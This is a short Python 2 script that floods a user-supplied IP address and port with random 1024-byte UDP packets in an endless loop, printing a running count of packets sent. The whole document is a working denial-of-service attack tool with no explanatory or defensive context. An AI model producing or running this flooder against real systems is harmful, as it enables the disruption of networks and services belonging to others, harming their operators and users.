import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
ip = raw_input('Target IP: ')
port = input('Port: ')
sent = 0

while True:
  sock.sendto(bytes,(ip,port))
  print "Sent %s packets to %s at port %s " % (sent,ip,port)
  sent = sent + 1
